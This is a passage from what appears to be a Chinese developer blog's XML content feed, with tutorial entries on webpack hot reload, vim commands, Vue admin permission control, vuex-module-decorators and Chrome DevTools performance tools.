<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> str <span class="keyword">from</span> <span class="string">&#x27;./source.js&#x27;</span></span><br><span class="line"><span class="built_in">console</span>.log(str)</span><br><span class="line"></span><br><span class="line"><span class="comment">//关键代码</span></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">module</span>.hot)&#123;</span><br><span class="line">    <span class="built_in">module</span>.hot.accept(<span class="string">&#x27;./source.js&#x27;</span>,<span class="function">()=&gt;</span>&#123;</span><br><span class="line">        <span class="comment">//注：这样写require是因为import只能放在页面的顶部</span></span><br><span class="line">        <span class="keyword">let</span> str=<span class="built_in">require</span>(<span class="string">&#x27;./source.js&#x27;</span>);</span><br><span class="line">        <span class="built_in">console</span>.log(str);</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>webpack</category>
      </categories>
      <tags>
        <tag>webpack</tag>
        <tag>打包构建</tag>
      </tags>
  </entry>
  <entry>
    <title>vim常用命令总结</title>
    <url>/20201126/110019.html</url>
    <content><![CDATA[<h5 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h5><blockquote>
<p>记录一下vim的常用操作命令</p>
</blockquote>
<a id="more"></a>

<h5 id="选择文本"><a href="#选择文本" class="headerlink" title="选择文本"></a>选择文本</h5><p><code>v</code>：从光标开始，光标后续所经过的地方会被选中，再按一次结束</p>
<p><code>V</code>：从光标当前行开始，光标经过的行都被选中，再按一次结束</p>
<h5 id="复制"><a href="#复制" class="headerlink" title="复制"></a>复制</h5><p><code>Y</code>：复制行</p>
<p><code>y</code>：复制</p>
<h5 id="粘贴"><a href="#粘贴" class="headerlink" title="粘贴"></a>粘贴</h5><p><code>P</code>：在光标前面粘贴</p>
<p><code>p</code>：在光标后面粘贴</p>
<h5 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h5><p><code>dd</code>：删除当前行</p>
<h5 id="撤销"><a href="#撤销" class="headerlink" title="撤销"></a>撤销</h5><p><code>u</code>：撤销上一步操作</p>
<p><code>U</code>：反撤销</p>
<h5 id="主要ex指令"><a href="#主要ex指令" class="headerlink" title="主要ex指令"></a>主要ex指令</h5><p><code>:w</code>：保存</p>
<p><code>:q</code>：退出</p>
<p><code>:h</code>：打开帮助</p>
<h5 id="排版"><a href="#排版" class="headerlink" title="排版"></a>排版</h5><p><code>==</code>：对光标所在行进行排版</p>
<p><code>n ==</code>：对光标及以下的n行内容进行排版</p>
<h5 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h5><p><code>i</code>：切换到输入模式</p>
<h5 id="移动"><a href="#移动" class="headerlink" title="移动"></a>移动</h5><p><code>w</code>：以word为单位进行光标的移动</p>
<p><code>nw</code>：以n个word为单位进行光标的移动</p>
<h5 id="找到当前的位置"><a href="#找到当前的位置" class="headerlink" title="找到当前的位置"></a>找到当前的位置</h5><p><code>ctrl+g</code>：告诉你当前所在位置</p>
<h5 id="搜索"><a href="#搜索" class="headerlink" title="搜索"></a>搜索</h5><p><code>/string</code>：搜索和string相关的内容</p>
<p><code>:set hlsearch</code>：高亮显示搜索结果</p>
<p><code>:set nohlsearch</code>：去掉高亮显示</p>
<h5 id="窗口分割"><a href="#窗口分割" class="headerlink" title="窗口分割"></a>窗口分割</h5><p><code>:split</code>：分割出一个新的窗口</p>
]]></content>
      <categories>
        <category>运维</category>
      </categories>
      <tags>
        <tag>运维</tag>
        <tag>vim</tag>
      </tags>
  </entry>
  <entry>
    <title>vue后台管理之精细化的权限控制</title>
    <url>/20210601/035440.html</url>
    <content><![CDATA[<h5 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h5><blockquote>
<p>做后台管理，权限控制是必不可少的，在这里做个记录。</p>
</blockquote>
<a id="more"></a>



<h5 id="1、权限组件"><a href="#1、权限组件" class="headerlink" title="1、权限组件"></a>1、权限组件</h5><p>使用函数式组件，只做权限控制功能，控制权限组件slot区域的内容是否能显示</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// components -&gt; AuthCheck.vue</span></span><br><span class="line">&lt;script&gt;</span><br><span class="line">	<span class="keyword">import</span> &#123; check &#125; <span class="keyword">from</span> <span class="string">&#x27;@/utils/auth&#x27;</span></span><br><span class="line">	<span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  	functional: <span class="literal">true</span>,</span><br><span class="line">    props: &#123;</span><br><span class="line">    	authority: &#123;</span><br><span class="line">      	type: <span class="built_in">Array</span>,</span><br><span class="line">        required: <span class="literal">true</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    render(h, context) &#123;</span><br><span class="line">    	<span class="keyword">const</span> &#123;props, scopedSlots&#125; = context</span><br><span class="line">      <span class="keyword">return</span> check(props.authority) ? scopedSlots.default() : <span class="literal">null</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>注册为全局组件</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// main.js</span></span><br><span class="line"><span class="keyword">import</span> AuthCheck <span class="keyword">from</span> <span class="string">&#x27;@/components/AuthCheck&#x27;</span></span><br><span class="line"></span><br><span class="line">Vue.component(<span class="string">&#x27;AuthCheck&#x27;</span>, AuthCheck)</span><br></pre></td></tr></table></figure>

<p>使用方式</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">	&lt;div&gt;</span><br><span class="line">    &lt;AuthCheck :authority=<span class="string">&quot;[&#x27;admin&#x27;]&quot;</span>&gt;</span><br><span class="line">  		<span class="comment">// some btns</span></span><br><span class="line">  	&lt;/AuthCheck&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br></pre></td></tr></table></figure>

<h5 id="2、权限指令"><a href="#2、权限指令" class="headerlink" title="2、权限指令"></a>2、权限指令</h5><p>使用插件的方式封装指令函数</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// directives -&gt; auth.js</span></span><br><span class="line"><span class="keyword">import</span> &#123;check&#125; <span class="keyword">from</span> <span class="string">&#x27;@/utils/auth&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">install</span>(<span class="params">Vue, optoins = &#123;&#125;</span>) </span>&#123;</span><br><span class="line">	Vue.directive(options.name || <span class="string">&#x27;auth&#x27;</span>, &#123;</span><br><span class="line">  	inserted(el, binding) &#123;</span><br><span class="line">    	<span class="keyword">if</span> (!check(binding.value)) &#123;</span><br><span class="line">      	el.parentNode &amp;&amp; el.parentNode.removeChild(el);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;install&#125;</span><br></pre></td></tr></table></figure>

<p>使用指令插件</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// main.js</span></span><br><span class="line"><span class="keyword">import</span> Auth <span class="keyword">from</span> <span class="string">&#x27;@/directives/auth&#x27;</span></span><br><span class="line"><span class="keyword">import</span> Vue <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"></span><br><span class="line">Vue.use(Auth)</span><br></pre></td></tr></table></figure>

<p>使用方式</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">	&lt;div&gt;</span><br><span class="line">    &lt;button v-auth=<span class="string">&quot;[&#x27;admin&#x27;]&quot;</span>&gt;&lt;/button&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br></pre></td></tr></table></figure>

<h5 id="3、两者优劣分析"><a href="#3、两者优劣分析" class="headerlink" title="3、两者优劣分析"></a>3、两者优劣分析</h5><ul>
<li>权限组件写着会复杂一些，但支持动态权限修改，比较灵活</li>
<li>权限指令会简单一些，但是不支持动态权限修改，因为已经删除掉的节点不能加回来了</li>
</ul>
]]></content>
      <categories>
        <category>vue, 后台管理</category>
      </categories>
      <tags>
        <tag>后台管理</tag>
      </tags>
  </entry>
  <entry>
    <title>vuex-module-decorators使用记录</title>
    <url>/20200916/083105.html</url>
    <content><![CDATA[<h5 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h5><blockquote>
<p>vuex-module-decorators是用 Typescript 写 vuex 的一个插件，在项目中有使用到该插件，在这里做个使用总结。</p>
</blockquote>
<a id="more"></a>

<h5 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install vuex-module-decorators</span><br><span class="line"><span class="meta">#</span><span class="bash"> 或者</span></span><br><span class="line">yarn add vuex-module-decorators</span><br></pre></td></tr></table></figure>

<h5 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h5><p>1、在<code>tsconfig.json</code>文件里面修改部分配置，如下所示</p>
<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;compilerOptions&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;experimentalDecorators&quot;</span>: <span class="literal">true</span> <span class="comment">//将实验性装饰器属性设置为true</span></span><br><span class="line">        <span class="string">&quot;importHelpers&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>2、修改vue项目配置文件<code>vue.config.js</code>，如下所示</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  <span class="comment">// ... your other options</span></span><br><span class="line">  transpileDependencies: [</span><br><span class="line">    <span class="string">&#x27;vuex-module-decorators&#x27;</span></span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="写法对比"><a href="#写法对比" class="headerlink" title="写法对比"></a>写法对比</h5><p>1、vuex原写法</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// equivalent eg. /app/store/posts.js</span></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  state: &#123;</span><br><span class="line">    posts: []</span><br><span class="line">  &#125;,</span><br><span class="line">  getters: &#123;</span><br><span class="line">    totalComments: <span class="function">(<span class="params">state</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> state.posts</span><br><span class="line">        .filter(<span class="function">(<span class="params">post</span>) =&gt;</span> &#123;</span><br><span class="line">          <span class="keyword">return</span> post.comments &amp;&amp; post.comments.length</span><br><span class="line">        &#125;)</span><br><span class="line">        .reduce(<span class="function">(<span class="params">sum, post</span>) =&gt;</span> &#123;</span><br><span class="line">          <span class="keyword">return</span> sum + post.comments.length</span><br><span class="line">        &#125;, <span class="number">0</span>)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  mutations: &#123;</span><br><span class="line">    updatePosts: <span class="function">(<span class="params">state, posts</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="comment">// &#x27;posts&#x27; is payload</span></span><br><span class="line">      state.posts = posts</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  actions: &#123;</span><br><span class="line">    fetchPosts: <span class="keyword">async</span> (context) =&gt; &#123;</span><br><span class="line">      <span class="comment">// the return of the function is passed as payload</span></span><br><span class="line">      <span class="keyword">const</span> payload = <span class="keyword">await</span> get(<span class="string">&#x27;https://jsonplaceholder.typicode.com/posts&#x27;</span>)</span><br><span class="line">      <span class="comment">// the value of &#x27;commit&#x27; in decorator is the mutation used</span></span><br><span class="line">      context.commit(<span class="string">&#x27;updatePosts&#x27;</span>, payload)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>2、vuex-module-decorators写法</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// eg. /app/store/posts.ts</span></span><br><span class="line"><span class="keyword">import</span> &#123; VuexModule, Module, Mutation, Action &#125; <span class="keyword">from</span> <span class="string">&#x27;vuex-module-decorators&#x27;</span></span><br><span class="line"><span class="keyword">import</span> &#123; get &#125; <span class="keyword">from</span> <span class="string">&#x27;axios&#x27;</span></span><br><span class="line"></span><br><span class="line">interface PostEntity &#123;</span><br><span class="line">  comments: string[]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@Module</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="class"><span class="keyword">class</span> <span class="title">Posts</span> <span class="keyword">extends</span> <span class="title">VuexModule</span> </span>&#123;</span><br><span class="line">  posts: PostEntity[] = [] <span class="comment">// initialize empty for now</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">get</span> <span class="title">totalComments</span>(): <span class="title">number</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.posts</span><br><span class="line">      .filter(<span class="function"><span class="params">post</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="comment">// Take those posts that have comments</span></span><br><span class="line">        <span class="keyword">return</span> post.comments &amp;&amp; post.comments.length</span><br><span class="line">      &#125;)</span><br><span class="line">      .reduce(<span class="function">(<span class="params">sum, post</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="comment">// Sum all the lengths of comments arrays</span></span><br><span class="line">        <span class="keyword">return</span> sum + post.comments.length</span><br><span class="line">      &#125;, <span class="number">0</span>)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  @Mutation</span><br><span class="line">  updatePosts(posts: PostEntity[]) &#123;</span><br><span class="line">    <span class="built_in">this</span>.posts = posts</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  @Action(&#123; <span class="attr">commit</span>: <span class="string">&#x27;updatePosts&#x27;</span> &#125;)</span><br><span class="line">  <span class="keyword">async</span> fetchPosts() &#123;</span><br><span class="line">    <span class="keyword">return</span> get(<span class="string">&#x27;https://jsonplaceholder.typicode.com/posts&#x27;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="调用"><a href="#调用" class="headerlink" title="调用"></a>调用</h5><figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;getModule&#125; <span class="keyword">from</span> <span class="string">&#x27;vuex-module-decorators&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> Post <span class="keyword">from</span> <span class="string">&#x27;@/store/posts&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> PostModule = getModule(Post);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用state</span></span><br><span class="line"><span class="keyword">const</span> posts = PostModule.posts;</span><br><span class="line"><span class="comment">// 使用getters</span></span><br><span class="line"><span class="keyword">const</span> totalComments = PostModule.totalComments;</span><br><span class="line"><span class="comment">// 提交mutation</span></span><br><span class="line">PostModule.updatePosts(newPostArr)</span><br><span class="line"><span class="comment">// 调用action</span></span><br><span class="line"><span class="keyword">await</span> PostModule.fetchPosts()</span><br></pre></td></tr></table></figure>

<h5 id="定义模块"><a href="#定义模块" class="headerlink" title="定义模块"></a>定义模块</h5><p>要定义一个模块，需要创建一个类继承于<code>VuexModule</code>，而且必须使用<code>Module</code>装饰器来装饰该类</p>
<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="comment">// @/store/module/test_module.ts</span></span><br><span class="line"><span class="keyword">import</span> &#123; Module, VuexModule &#125; <span class="keyword">from</span> <span class="string">&#x27;vuex-module-decorators&#x27;</span></span><br><span class="line"><span class="meta">@Module</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">class</span> Test_Module <span class="keyword">extends</span> VuexModule &#123;</span><br><span class="line">    test_field: <span class="built_in">number</span> = <span class="string">&#x27;somedata&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="使用模块"><a href="#使用模块" class="headerlink" title="使用模块"></a>使用模块</h5><p>将Test_Module类本身作为一个模块使用，而不是一个由类构造的对象</p>
<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> Vuex <span class="keyword">from</span> <span class="string">&#x27;vuex&#x27;</span></span><br><span class="line"><span class="keyword">import</span> Test_Module <span class="keyword">from</span> <span class="string">&#x27;./module/test_module&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> store = <span class="keyword">new</span> Vuex.Store(&#123;</span><br><span class="line">    modules: &#123;</span><br><span class="line">        tMod:Test_Module</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<h5 id="模块内容调用"><a href="#模块内容调用" class="headerlink" title="模块内容调用"></a>模块内容调用</h5><p>1、state</p>
<ul>
<li><p>使用import引入store</p>
<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> store <span class="keyword">from</span> <span class="string">&#x27;@/store&#x27;</span></span><br><span class="line"></span><br><span class="line">store.state.tMod.test_field</span><br></pre></td></tr></table></figure>
</li>
<li><p>在组件内使用<code>this.$store</code></p>
<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="built_in">this</span>.$store.state.tMod.test_field</span><br></pre></td></tr></table></figure>
</li>
<li><p>使用<code>getModule()</code>来创建类型安全存取器(type-safe accessor)</p>
<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; Module, VuexModule, getModule&#125; <span class="keyword">from</span> <span class="string">&#x27;vuex-module-decorators&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> store frm <span class="string">&#x27;@/store&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Module</span>(dynamic: <span class="literal">true</span>, store, name:<span class="string">&#x27;tMod&#x27;</span>)</span><br><span class="line"><span class="keyword">class</span> TestModule <span class="keyword">extends</span> VuexModule &#123;</span><br><span class="line">    test_field: <span class="built_in">number</span> = <span class="number">10</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> TMod = getModule(TestModule)</span><br><span class="line">TMod.test_field</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h5 id="State"><a href="#State" class="headerlink" title="State"></a>State</h5><p>模块文件类里面的属性都会转化为state属性</p>
<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; Module, VuexModule&#125; <span class="keyword">from</span> <span class="string">&#x27;vuex-module-decorators&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@Module</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">class</span> Vehicle <span class="keyword">extends</span> VuexModule&#123;</span><br><span class="line">    wheels = <span class="number">2</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>等同以下原始写法</p>
<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">    state: &#123;</span><br><span class="line">        wheels: <span class="number">2</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="Getters"><a href="#Getters" class="headerlink" title="Getters"></a>Getters</h5><p>模块文件类里面所有的ES6 getter 函数都会转化为vuex getters</p>
<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;Module, VuexModule&#125; <span class="keyword">from</span> <span class="string">&#x27;vuex-module-decorators&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@Module</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">class</span> Vehicle <span class="keyword">extends</span> VuexModule &#123;</span><br><span class="line">    wheels =<span class="number">2</span></span><br><span class="line">    </span><br><span class="line">    get axles() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.wheels / <span class="number">2</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>等同于以下原始写法</p>
<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">    state: &#123;</span><br><span class="line">        wheels: <span class="number">2</span></span><br><span class="line">    &#125;,</span><br><span class="line">    getters: &#123;</span><br><span class="line">        axles: <span class="function">(<span class="params">state</span>) =&gt;</span> state.wheels / <span class="number">2</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="Mutations"><a href="#Mutations" class="headerlink" title="Mutations"></a>Mutations</h5><p>模块文件类里面所有使用<code>@Mutation</code>装饰器修饰的方法都会被转换成vuex的mutations</p>
<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;Module, VuexModule, Mutation&#125; <span class="keyword">from</span> <span class="string">&#x27;vuex-module-decorators&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@Module</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">class</span> Vehicle <span class="keyword">extends</span> VuexModule &#123;</span><br><span class="line">    wheels =<span class="number">2</span></span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Mutation</span></span><br><span class="line">    puncture(n: <span class="built_in">number</span>) &#123;</span><br><span class="line">        <span class="built_in">this</span>.wheels = <span class="built_in">this</span>.wheels - n</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>等同于以下原始写法</p>
<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">    state: &#123;</span><br><span class="line">        wheels: <span class="number">2</span></span><br><span class="line">    &#125;,</span><br><span class="line">    mutations: &#123;</span><br><span class="line">        puncture: <span class="function">(<span class="params">state, payload</span>) =&gt;</span> &#123;</span><br><span class="line">            state.wheels = state.wheels - payload</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="Actions"><a href="#Actions" class="headerlink" title="Actions"></a>Actions</h5><p>模块文件类里面所有使用<code>@Action</code>装饰器修饰的方法都会被转换成vuex的actions</p>
<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;Module, VuexModule, Mutation, Action&#125; <span class="keyword">from</span> <span class="string">&#x27;vuex-module-decorators&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@Module</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">class</span> Vehicle <span class="keyword">extends</span> VuexModule &#123;</span><br><span class="line">    wheels =<span class="number">2</span></span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Mutation</span></span><br><span class="line">    addWheel(n: <span class="built_in">number</span>) &#123;</span><br><span class="line">        <span class="built_in">this</span>.wheels = <span class="built_in">this</span>.wheels + n</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Action</span></span><br><span class="line">    <span class="keyword">async</span> fetchNewWheels(wheelStore: <span class="built_in">string</span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> wheels = <span class="keyword">await</span> get(wheelStore)</span><br><span class="line">        <span class="built_in">this</span>.context.commit(<span class="string">&#x27;addWheel&#x27;</span>, wheels)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>等同于以下原始写法</p>
<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> request = <span class="built_in">require</span>(<span class="string">&#x27;request&#x27;</span>)</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">    state: &#123;</span><br><span class="line">        wheels: <span class="number">2</span></span><br><span class="line">    &#125;,</span><br><span class="line">    mutations: &#123;</span><br><span class="line">        addWheel: <span class="function">(<span class="params">state,payload</span>) =&gt;</span> &#123;</span><br><span class="line">            state.wheels = state.wheels + payload</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    actions: &#123;</span><br><span class="line">        fetchNewWheels: <span class="keyword">async</span>(&#123;commit&#125;, payload) =&gt; &#123;</span><br><span class="line">            <span class="keyword">const</span> wheels = <span class="keyword">await</span> request.get(payload)</span><br><span class="line">            commit(<span class="string">&#x27;addWheel&#x27;</span>, wheels)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="命名空间模块"><a href="#命名空间模块" class="headerlink" title="命名空间模块"></a>命名空间模块</h5><p>如果你尝试以命名空间的方式使用模块，那么你就需要在<code>@Module</code>中进行指定</p>
<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="comment">//@/store/module/TestModule.ts</span></span><br><span class="line"><span class="meta">@Module</span>(&#123; namespaced: <span class="literal">true</span>, name: <span class="string">&#x27;TM&#x27;</span>&#125;)</span><br><span class="line"><span class="keyword">class</span> TestModule <span class="keyword">extends</span> VuexModule &#123;</span><br><span class="line">    wheels = <span class="number">2</span></span><br><span class="line">    <span class="meta">@Mutation</span></span><br><span class="line">    incrWheels(extra: <span class="built_in">number</span>) &#123;</span><br><span class="line">        <span class="built_in">this</span>.wheels +=extra</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    get axles() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.wheels / <span class="number">2</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//@/store/index.ts</span></span><br><span class="line"><span class="keyword">const</span> store = <span class="keyword">new</span> Vuex.Store(&#123;</span><br><span class="line">    modules:&#123;</span><br><span class="line">        TM:TestModule</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>装饰器里面的<code>name</code>字段需要和@/store/index.ts里面的定义模块的名字相同</p>
<h5 id="动态模块"><a href="#动态模块" class="headerlink" title="动态模块"></a>动态模块</h5><p>只需要将一些属性传递给<code>@Module</code>装饰器即可动态地注册模块</p>
<p>步骤1：建立store文件</p>
<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="comment">// @/store/index.ts</span></span><br><span class="line"><span class="keyword">import</span> Vuex <span class="keyword">from</span> <span class="string">&#x27;vuex&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> store = <span class="keyword">new</span> Vuex.Store(&#123;</span><br><span class="line">	<span class="comment">// 如果你定义的所有模块都是动态的，这里可以不用写内容</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>步骤2：创建动态模块</p>
<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> store <span class="keyword">from</span> <span class="string">&#x27;@/store&#x27;</span></span><br><span class="line"><span class="keyword">import</span> &#123;Module, VuexModule&#125; <span class="keyword">from</span> <span class="string">&#x27;vuex-module-decorators&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 在装饰器里面设置属性dynamic为true即可动态注册模块</span></span><br><span class="line"><span class="meta">@Module</span>(&#123;dynamic: ture, store, name:<span class="string">&#x27;TM&#x27;</span>&#125;)</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">class</span> TestModule <span class="keyword">extends</span> VuexModule &#123;</span><br><span class="line">	<span class="comment">// 模块定义内容</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h5><ul>
<li>github仓库地址 <a href="https://github.com/championswimmer/vuex-module-decorators">https://github.com/championswimmer/vuex-module-decorators</a> </li>
<li>官方文档地址 <a href="https://championswimmer.in/vuex-module-decorators">https://championswimmer.in/vuex-module-decorators</a> </li>
</ul>
]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>vuex</tag>
        <tag>typescript</tag>
      </tags>
  </entry>
  <entry>
    <title>使用Chrome开发工具排查页面性能问题</title>
    <url>/20200925/082122.html</url>
    <content><![CDATA[<h5 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h5><blockquote>
<p>学会使用Chrome开发工具来排查、定位、解决影响页面性能的问题，包括内存泄漏、内存膨胀和频繁的垃圾回收等。</p>
</blockquote>
<a id="more"></a>

<h5 id="监测浏览器页面的实时内存情况"><a href="#监测浏览器页面的实时内存情况" class="headerlink" title="监测浏览器页面的实时内存情况"></a>监测浏览器页面的实时内存情况</h5><h6 id="1、使用Chrome的任务管理器"><a href="#1、使用Chrome的任务管理器" class="headerlink" title="1、使用Chrome的任务管理器"></a>1、使用Chrome的任务管理器</h6><p>使用<code>shift + Esc</code>组合键打开chrome的任务管理器</p>
<p><img data-src="/images/202009252008/2-1.png"></p>
<h6 id="2、使用Performance-monitor"><a href="#2、使用Performance-monitor" class="headerlink" title="2、使用Performance monitor"></a>2、使用Performance monitor</h6><p>第1步：按下<code>F12</code>打开chrome浏览器控制台</p>
<p><img data-src="/images/202009252008/2-2.png"></p>
<p>第2步：按下图所示操作，选择Performance monitor工具</p>
<p><img data-src="/images/202009252008/2-3.png"></p>
<p>第3步：运行界面如下图所示,可以实时监听页面的CPU使用情况，JS堆，DOM节点数，样式重绘重排等相关信息</p>
<p><img data-src="/images/202009252008/2-4.png"></p>
<h5 id="使用Performance"><a href="#使用Performance" class="headerlink" title="使用Performance"></a>使用Performance</h5><p>Chrorme浏览器的performance面板可以让我们查看某些操作时段内页面的各项指标，以此做分析来排查定位页面性能问题。</p>
